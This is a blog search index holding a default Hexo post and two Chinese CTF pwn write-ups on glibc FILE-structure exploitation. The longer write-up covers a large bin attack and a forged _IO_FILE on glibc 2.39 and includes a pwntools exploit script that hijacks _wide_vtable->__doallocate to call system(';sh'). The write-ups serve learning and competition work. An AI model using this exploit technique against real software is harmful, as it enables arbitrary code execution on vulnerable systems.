<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hello World</title>
    <url>/2026/07/21/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2026/07/22/stdout(%E9%AB%98%E7%89%88%E6%9C%ACglibc).md/stdout(%E9%AB%98%E7%89%88%E6%9C%ACglibc)/</url>
    <content><![CDATA[<h1 id="stdout-高版本glibc"><a href="#stdout-高版本glibc" class="headerlink" title="stdout(高版本glibc)"></a>stdout(高版本glibc)</h1><p>ida：<img src="/assets/Image_1770554399694_854-20260208204048-2mglm9k.png" alt="Image_1770554399694_854"><br>         <img src="/assets/Image_1770554404484_470-20260208204110-hv4zhm2.png" alt="Image_1770554404484_470"><br> 开局直接就可以了bss处储存的_IO_2_1_stdout_的地址，libc基址就直接有了，且读入的fb就是这里bss段存了stdout结构的地址，且下面有puts的调用</p>
<h3 id="漏洞：puts的调用会调用vtable中的xsputn，伪造vtable为另外合法的vtable，因为在高版本不能直接改写vtable了，再利用io-wfile-jumps-…-seekoff-IO-switch-to-wget-mode来跳转system"><a href="#漏洞：puts的调用会调用vtable中的xsputn，伪造vtable为另外合法的vtable，因为在高版本不能直接改写vtable了，再利用io-wfile-jumps-…-seekoff-IO-switch-to-wget-mode来跳转system" class="headerlink" title="漏洞：puts的调用会调用vtable中的xsputn，伪造vtable为另外合法的vtable，因为在高版本不能直接改写vtable了，再利用io_wfile_jumps-&gt;….seekoff-&gt;_IO_switch_to_wget_mode来跳转system"></a>漏洞：puts的调用会调用vtable中的xsputn，伪造vtable为另外合法的vtable，因为在高版本不能直接改写vtable了，再利用io_wfile_jumps-&gt;….seekoff-&gt;_IO_switch_to_wget_mode来跳转system</h3><ol>
<li>….seekoff可以在本地gdb里面打印出来，得到偏移，在seekoff里面想要调用上面调用链的最后一个还需要让elf结构中的write_ptr大于write_base<br> 进入到wget后的关键调用就是_IO_wdoallocbuf的调用，这里也有检查，要求_wide_data大于IO_buf_base处，其关键调用链：_wide_data-&gt;wide_vtable-&gt;doallocate(fd)</li>
<li>接下来就是在原vtable写入合法vtable，seekoff的偏移位置0x48，上面调用链偏移依次为0xe0和0x18，而wide_data的位置是从elf结构中0xa的偏移取得的<br> 所以再最后doallocate处设置system，前面就依次填入合适地址即可</li>
<li>此外锁的位置要有效，可以直接用原来的，也可以在换上对于ld文件及libc文件后用gdb算出原本锁地址和得到stdout地址的偏移，也可以换上后直接libc基址算偏移</li>
</ol>
<p>exp：<img src="/assets/Image_1770556289540_890-20260208211136-56dkmaz.png" alt="Image_1770556289540_890"></p>
<p>参考文章：<a href="https://blog.mcitd.cn/posts/newstar2025/wp/#stdout">https://blog.mcitd.cn/posts/newstar2025/wp/#stdout</a></p>
]]></content>
  </entry>
  <entry>
    <title>堆上的IO，largbin高版本的利用</title>
    <url>/2026/05/24/abab/</url>
    <content><![CDATA[<h1 id="堆上的IO，largbin高版本的利用"><a href="#堆上的IO，largbin高版本的利用" class="headerlink" title="堆上的IO，largbin高版本的利用"></a>堆上的IO，largbin高版本的利用</h1><p><img src="/assets/image-20260524195338-loa2jsp.png" alt="image"><br><a href="read://https_xz.aliyun.com/?url=https%3A%2F%2Fxz.aliyun.com%2Fnews%2F15081">浅析Large_bins_attack在高低版本的利用</a><br><a href="https://www.cnblogs.com/damoxilai/p/16380750.html">large bin attack - DAMOXILAI - 博客园</a></p>
<p>● exit()的IO调用链<br>└─ __run_exit_handlers<br>└─ 遍历 atexit 回调链表<br>└─ _IO_cleanup()                       [libc初始化时注册的ef_cxa回调]<br>└─ _IO_flush_all_lockp(1)</p>
<pre><code>  for (fp = _IO_list_all; fp != NULL; fp = fp-&gt;_chain)  
  │  
  ├─ 条件1: _IO_flockfile(fp)  
  │         → fp-&gt;_lock == NULL ? 跳锁 : 加锁  
  │  
  ├─ 条件2(分支A): _mode &lt;= 0 &amp;&amp; _IO_write_ptr &gt; _IO_write_base  
  │   条件2(分支B): _mode &gt; 0  &amp;&amp; _wide_data-&gt;_IO_write_ptr  
  │                                        &gt; _wide_data-&gt;_IO_write_base  
  │   任一成立 → 进入 _IO_OVERFLOW  
  │  
  └─ _IO_OVERFLOW(fp, EOF)  
      │  展开为: (fp-&gt;vtable-&gt;__overflow)(fp, EOF)  
      │  
      └─ _IO_wfile_overflow(fp, EOF)     [vtable = _IO_wfile_jumps]  
          │  
          ├─ 检查1: _flags &amp; _IO_NO_WRITES (0x8) → 有则return  
          │  
          ├─ 检查2: _flags &amp; _IO_CURRENTLY_PUTTING (0x800)  
          │         → 没设置则进入if  
          │  
          └─ 检查3: _wide_data-&gt;_IO_write_base == 0  
              │  → 是 → _IO_wdoallocbuf(fp)  
              │  
              └─ _IO_wdoallocbuf(fp)  
                  │  
                  ├─ 检查: _wide_data-&gt;_IO_buf_base → 有则return  
                  │  
                  └─ (fp-&gt;_wide_data-&gt;_wide_vtable-&gt;__doallocate)(fp)  
                      │  展开: system(fp)  
                      │  
                      └─ system(&quot;;sh&quot;) → /bin/sh  
</code></pre>
<p>ida:<img src="/%5Cassets%5Cimage-20260529213735-i0bjl95.png" alt="image"><br>简单阐述一下功能  create：创建函数，但是堆申请大小要至少大于0x408<br>delete：删除函数，但是存在uaf<br>show：输出堆块数据区<br>edit：根据申请堆块大小来写数据区内容<br>exit：正常free掉后执行exit（0）退出（漏洞所在）<br>大致思路：<br>泄露libc基址，直接利用unsortedbin来泄露即可，delete对应堆块然后删掉show即可，再减掉偏移即可<br>然后进入正式的利用：利用large_bin来构造伪造_IO_file_结构<br>对应资料参考：<a href="https://xz.aliyun.com/news/15081">浅析Large_bins_attack在高低版本的利用-先知社区</a><br>这里的libc版本是2.39<br>assert (chunk_main_arena (bck-&gt;bk));&#x2F;&#x2F;断言bck-&gt;bk属于main_arena<br>if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))<br>{<br>fwd &#x3D; bck; &#x2F;&#x2F;这里的fwd可以粗略的认为是large_bin归属的main_arena<br>bck &#x3D; bck-&gt;bk; &#x2F;&#x2F;bck成了main_arena的bk指针指向的堆块<br>victim-&gt;fd_nextsize &#x3D; fwd-&gt;fd; &#x2F;&#x2F;我们申请的小堆块的fd_nextsize指向了main_arena的fd指针，也就是所在的large_bin的最大的堆块<br>victim-&gt;bk_nextsize &#x3D; fwd-&gt;fd-&gt;bk_nextsize;&#x2F;&#x2F;攻击点，没有检测，所以我们可以伪造大堆块的bk_nextsize<br>fwd-&gt;fd-&gt;bk_nextsize &#x3D; victim-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; victim; &#x2F;&#x2F;先进行右值运算，如果在没有进行修改的情况下，等式可以化简为fwd-&gt;fd-&gt;bk_nextsize &#x3D; victim，也就是最大堆块的bk_nextsize指向我们的最小堆块victim<br>}<br>也就是，这里如果整理进去的large_bin比large_bin里面最小的还要小，那么就会执行这个，也就是victim，新整理进去的，会调整它的fd_nextsize和bk_nextsize，之后就是最后一步，也就是最重要的会根据已经改的victim_的bk_nextsize的把对应堆块的fd_nextsize改成victim,这里就是主要漏洞点，那么这里控制到了victim堆块的fd_nextsize，也就相当于可以控制指针了，也就是其bk_nextsize所指向的内容的0x10处的指针指向了victim堆块，之后呢伪造victim堆块的结构体即可</p>
<p>第一步先改堆块：<br>add(2,0x508)<br>add(0,0x520)<br>add(5,0x508)<br>add(1,0x500)<br>delete(0)<br>show(0)<br>p.recvuntil(b’content : ‘)<br>addr&#x3D;u64(p.recv(6).ljust(8,b’\x00’))<br>print(hex(addr))<br>#gdb.attach(p)<br>base&#x3D;addr-0x203b20<br>IO_list&#x3D;base+libc.sym[‘_IO_list_all’]<br>print(hex(base))<br>system&#x3D;base+libc.sym[‘system’]<br>IO_wfile_jumps&#x3D;base+libc.sym[‘_IO_wfile_jumps’]<br>head&#x3D;addr+0x430<br>#gdb.attach(p)<br>payload&#x3D;b’a’<em>0x10<br>add(3,0x530)<br>edit(0,payload)<br>show(0)<br>p.recvuntil(b’content : aaaaaaaaaaaaaaaa’)<br>heap&#x3D;u64(p.recv(6).ljust(8,b’\x00’))<br>print(hex(heap))<br>#gdb.attach(p)<br>payload&#x3D;p64(head)</em>* 2+p64(heap)+p64(IO_list-0x20)<br>edit(0,payload)<br>delete(1)<br>add(4,0x540)<br>#gdb.attach(p)<br>edit(5, b’a’ * 0x500 + p32(0xfffff7f5) + b’;sh\x00’)<br>chunk&#x3D;heap+0xa40<br>#gdb.attach(p)<br>这里很明显是选用的堆块0和堆块1来使能够构造出能够伪造IO_file的结构体堆块，这里的结构体堆块明显就是1了，由于1的bk_nextsize会被改成0的bk_nextsize,<br>所以这里直接先利用uaf来伪造好其内容即可，之后再次之前还需要去拿到堆块的地址，才行，不然后面没法去还原堆块的head，其实也就是main_arena，尝试了下，可以<br>其实也可以换上对应libc来计算偏移，因为largbin在只有一个堆块的时候，它的bk_nextsize和fd_nextsize是指向自己的头，所以这里泄露出来的heap其实就是堆块0的头地址，这里加上加上0xa40正好是堆块1的头地址，并且heap本身也就是堆块0来伪造时还原原部分的东西<br>这里堆块1的头地址，也是也是方便后面伪造的时候调转的地址<br>伪造的_IO_file结构：<br>edit(5, b’a’ * 0x500 + p32(0xfffff7f5) + b’;sh\x00’)<br>chunk&#x3D;heap+0xa40<br>#gdb.attach(p)&#x2F;&#x2F;注意size段也占了一个<br>fake_IO &#x3D; p64(0) * 2 + p64(1) + p64(2)<br>fake_IO &#x3D; fake_IO.ljust(0xa0 - 0x10,b’\x00’) + p64(chunk + 0x100) #wide_data<br>fake_IO &#x3D; fake_IO.ljust(0xc0 - 0x10,b’\x00’) + p64(0xffffffffffffffff) #mode<br>fake_IO &#x3D; fake_IO.ljust(0xd8 - 0x10,b’\x00’) + p64(IO_wfile_jumps) #vtable<br>fake_IO &#x3D; fake_IO.ljust(0x100 - 0x10 + 0xe0,b’\x00’) + p64(chunk + 0x200) #_wide_data-&gt;_wide_vtable<br>fake_IO &#x3D; fake_IO.ljust(0x200 - 0x10,b’\x00’) + p64(0) * 13 + p64(system) # _wide_data-&gt;_wide_vtable-&gt;doallocate<br>edit(1,fake_IO)</p>
<p>梳理劫持流程：<br>0x00        _flags                chunk header[0x00] &#x3D; prev_size<br>0x08        _IO_read_ptr          chunk header[0x08] &#x3D; size<br>0x10        _IO_read_end          fake_IO[0x00] &#x3D; p64(0)<br>0x18        _IO_read_base         fake_IO[0x08] &#x3D; p64(0)<br>0x20        _IO_write_base        fake_IO[0x10] &#x3D; p64(1)  ←!<br>0x28        _IO_write_ptr         fake_IO[0x18] &#x3D; p64(2)  ←!<br>0x30        _IO_write_end         fake_IO[0x20] &#x3D; 0 (ljust填充)<br>0x38        _IO_buf_base          0 (ljust)<br>0x40        _IO_buf_end           0<br>…<br>0x68        _chain                0 (ljust)<br>…<br>0x88        _lock                 0 (ljust)<br>…<br>0xa0        _wide_data            fake_IO[0x90] &#x3D; chunk+0x100<br>…<br>0xc0        _mode                 fake_IO[0xb0] &#x3D; 0xFFFFFFFFFFFFFFFF<br>0xc4~0xd7   padding              0<br>0xd8        vtable                fake_IO[0xc8] &#x3D; _IO_wfile_jumps<br>先展示调用链就是最开头的那个，第一个过条件时_IO_flush_all_lockp(),这里注意下伪造的_IO_file_结构里面的锁处要为0，否则无法进行，<br>然后就i是进入IO_overflow的条件_mode &lt;&#x3D; 0 &amp;&amp; _IO_write_ptr &gt; _IO_write_base，还有另外一个分支，这里用的时这个<br>可以看到这里的write_ptr确实时大于base的mode的伪造也是小于0的负数，所以这里就绕过进入了_IO_overflow<br>进入IO_overflow以后就是：</p>
<p>_IO_wfile_overflow(FILE *f, wint_t wch)<br>{<br>&#x2F;&#x2F; —- 检查1: _IO_NO_WRITES 标志 —-<br>if (f-&gt;_flags &amp; _IO_NO_WRITES)  &#x2F;&#x2F; _IO_NO_WRITES &#x3D; 0x0008<br>{<br>f-&gt;_flags |&#x3D; _IO_ERR_SEEN;<br>__set_errno(EBADF);<br>return WEOF;                &#x2F;&#x2F; ← 如果flags有0x8就死在这<br>}<br>&#x2F;&#x2F; 我们的 flags &#x3D; 0, 不触发 ?</p>
<p>&#x2F;&#x2F; —- 检查2: 当前不在”正在写”状态 —-<br>if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) &#x3D;&#x3D; 0)  &#x2F;&#x2F; 0x0800<br>{<br>&#x2F;&#x2F; 宽字符写缓冲区还没分配?<br>if (f-&gt;_wide_data-&gt;_IO_write_base &#x3D;&#x3D; 0)     &#x2F;&#x2F; ← 需要为0!<br>{<br>&#x2F;&#x2F; —- 分配宽字符缓冲区 —-<br>_IO_wdoallocbuf(f);                     &#x2F;&#x2F; ← 攻击触发点!<br>&#x2F;&#x2F; …<br>}<br>}<br>&#x2F;&#x2F; 我们的 setup:<br>&#x2F;&#x2F;   _flags &#x3D; 0                          → 不触发 _IO_NO_WRITES<br>&#x2F;&#x2F;   _flags &amp; 0x800 &#x3D; 0                  → 走if分支<br>&#x2F;&#x2F;   _wide_data → chunk+0x100            → _IO_write_base &#x3D; 0 ?<br>}<br>这里的话只要flag的头里面没有0x8即可过检查，这里需要注意wide_data所指向的_IO_write_base和我们伪造的write_base不一定时一样的，因为这个是时根据wide_data的指针内容和对应的偏移来跳转的<br>wide_data的具体结构：<br>struct _IO_wide_data           &#x2F;&#x2F; 宽字符数据结构体<br>{<br>wchar_t *_IO_read_ptr;     &#x2F;&#x2F; 0x00<br>wchar_t *_IO_read_end;     &#x2F;&#x2F; 0x08<br>wchar_t *_IO_read_base;    &#x2F;&#x2F; 0x10<br>wchar_t *_IO_write_base;   &#x2F;&#x2F; 0x18: ← _IO_wfile_overflow检查这里是否为0<br>wchar_t *_IO_write_ptr;    &#x2F;&#x2F; 0x20<br>wchar_t *_IO_write_end;    &#x2F;&#x2F; 0x28<br>wchar_t *_IO_buf_base;     &#x2F;&#x2F; 0x30<br>wchar_t *_IO_buf_end;      &#x2F;&#x2F; 0x38<br>wchar_t *_IO_save_base;    &#x2F;&#x2F; 0x40<br>wchar_t *_IO_backup_base;  &#x2F;&#x2F; 0x48<br>wchar_t *_IO_save_end;     &#x2F;&#x2F; 0x50<br>__mbstate_t _IO_state;     &#x2F;&#x2F; 0x58<br>__mbstate_t _IO_last_state;&#x2F;&#x2F; 0x60<br>struct _IO_codecvt _codecvt;&#x2F;&#x2F; 0x68<br>wchar_t _shortbuf[1];      &#x2F;&#x2F; 0xc8<br>&#x2F;&#x2F; …<br>const struct _IO_jump_t *_wide_vtable; &#x2F;&#x2F; 0xe0: ← 假跳板目标!<br>&#x2F;&#x2F;                                        __doallocate替换为system<br>};<br>这里的话也就是wide指针的0x18的地方为0即可，之后就进入到了 _IO_wdoallocbuf(f)<br>进去之后呢，就是调用了fp-&gt;_wide_data-&gt;_wide_vtable-&gt;__doallocate<br>这里可以看到wide_vtable对于wide_data的 偏移是0xe0，doallcate在vtable偏移0x68处，这个位置放上system即可<br>_wide_vtable:<br>const struct _IO_jump_t _IO_wfile_jumps <strong>attribute</strong>((section(“__libc_IO_vtables”))) &#x3D;<br>{<br>0,                       &#x2F;&#x2F; 0x00 __dummy<br>0,                       &#x2F;&#x2F; 0x08 __dummy2<br>_IO_file_finish,         &#x2F;&#x2F; 0x10 __finish<br>_IO_wfile_overflow,      &#x2F;&#x2F; 0x18 __overflow    ← _IO_OVERFLOW调这里<br>_IO_wfile_underflow,     &#x2F;&#x2F; 0x20 __underflow<br>_IO_wfile_underflow,     &#x2F;&#x2F; 0x28 __uflow<br>_IO_wdefault_pbackfail,  &#x2F;&#x2F; 0x30 __pbackfail<br>_IO_wdefault_xsputn,     &#x2F;&#x2F; 0x38 __xsputn<br>_IO_wdefault_xsgetn,     &#x2F;&#x2F; 0x40 __xsgetn<br>_IO_wfile_seekoff,       &#x2F;&#x2F; 0x48 __seekoff<br>_IO_default_seekpos,     &#x2F;&#x2F; 0x50 __seekpos<br>_IO_default_setbuf,      &#x2F;&#x2F; 0x58 __setbuf<br>_IO_wfile_sync,          &#x2F;&#x2F; 0x60 __sync<br>_IO_wfile_doallocate,    &#x2F;&#x2F; 0x68 __doallocate  ← 正常路径<br>_IO_file_read,           &#x2F;&#x2F; 0x70 __read<br>_IO_file_write,          &#x2F;&#x2F; 0x78 __write<br>_IO_file_seek,           &#x2F;&#x2F; 0x80 __seek<br>_IO_file_close,          &#x2F;&#x2F; 0x88 __close<br>_IO_file_stat,           &#x2F;&#x2F; 0x90 __stat<br>_IO_wfile_showmanyc,     &#x2F;&#x2F; 0x98 __showmanyc<br>_IO_wfile_imbue,         &#x2F;&#x2F; 0xa0 __imbue<br>};<br>这里可以看到doallcate在wide_vtable里面的偏移是0x68，就是执行对应位置的system了，system（sh）</p>
<p>‍</p>
]]></content>
  </entry>
</search>
